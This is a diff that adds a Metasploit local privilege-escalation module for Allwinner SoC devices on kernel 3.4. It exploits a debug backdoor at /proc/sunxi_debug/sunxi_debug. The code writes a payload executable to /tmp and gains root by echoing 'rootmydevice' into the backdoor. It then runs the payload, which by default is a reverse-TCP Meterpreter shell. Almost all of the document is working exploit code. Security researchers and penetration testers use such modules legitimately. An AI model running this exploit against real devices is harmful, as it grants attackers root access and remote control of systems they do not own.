@@ -1,0 +1,83 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require "msf/core"
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+        "Name"           => "Allwinner 3.4 Legacy Kernel Local Privilege Escalation",
+        "Description"    => %q{
+          This module attempts to exploit a debug backdoor privilege escalation in
+          Allwinner SoC based devices.
+          Vulnerable Allwinner SoC chips: H3, A83T or H8 which rely on Kernel 3.4
+          Vulnerable OS: all OS images available for Orange Pis,
+                         any for FriendlyARM's NanoPi M1,
+                         SinoVoip's M2+ and M3,
+                         Cuebietech's Cubietruck +
+                         Linksprite's pcDuino8 Uno
+          Exploitation may be possible against Dragon (x10) and Allwinner Android tablets
+        },
+        "License"        => MSF_LICENSE,
+        "Author"         =>
+          [
+            "h00die <mike@stcyrsecurity.com>",  # Module
+            "KotCzarny"                         # Discovery
+          ],
+        "Platform"       => [ "android", "linux" ],
+        "DisclosureDate" => "Apr 30 2016",
+        "DefaultOptions" => {
+          "payload" => "linux/armle/mettle/reverse_tcp"
+        },
+        "Privileged"     => true,
+        "Arch"           => ARCH_ARMLE,
+        "References"     =>
+          [
+            [ "URL", "http://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/"],
+            [ "URL", "https://webcache.googleusercontent.com/search?q=cache:l2QYVUcDflkJ:" \
+                     "https://github.com/allwinner-zh/linux-3.4-sunxi/blob/master/arch/arm/mach-sunxi/sunxi-debug.c+&cd=3&hl=en&ct=clnk&gl=us"],
+            [ "URL", "http://irclog.whitequark.org/linux-sunxi/2016-04-29#16314390"]
+          ],
+        "SessionTypes"   => [ "shell", "meterpreter" ],
+        'Targets'        =>
+          [
+            [ 'Auto',           { } ]
+          ],
+        'DefaultTarget'  => 0,
+      ))
+  end
+
+  def check
+    backdoor = '/proc/sunxi_debug/sunxi_debug'
+    if file_exist?(backdoor)
+      Exploit::CheckCode::Appears
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+    backdoor = '/proc/sunxi_debug/sunxi_debug'
+    if file_exist?(backdoor)
+      pl = generate_payload_exe
+
+      exe_file = "/tmp/#{rand_text_alpha(5)}.elf"
+      vprint_good "Backdoor Found, writing payload to #{exe_file}"
+      write_file(exe_file, pl)
+      cmd_exec("chmod +x #{exe_file}")
+
+      vprint_good 'Escalating'
+      cmd_exec("echo rootmydevice > #{backdoor}; #{exe_file}")
+    else
+      print_error "Backdoor #{backdoor} not found."
+    end
+  end
+end
